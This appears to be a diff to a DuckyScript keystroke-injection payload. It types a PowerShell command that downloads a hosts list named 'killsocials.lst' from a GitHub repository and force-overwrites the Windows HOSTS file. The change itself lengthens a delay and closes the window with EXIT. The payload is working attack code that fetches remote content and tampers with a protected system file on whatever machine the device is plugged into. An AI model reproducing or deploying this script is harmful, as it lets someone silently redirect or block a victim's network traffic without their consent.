@@ -30,5 +30,6 @@ REM  - Change the URI to the correct path.
 
 STRING cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/killsocials.lst' -OutFile 'HOSTS';Copy-Item 'HOSTS' -Destination 'C:\Windows\System32\drivers\etc\HOSTS' -Recurse -force;
 ENTER
-DELAY 500
-GUI d
+DELAY 1000
+STRING EXIT
+ENTER
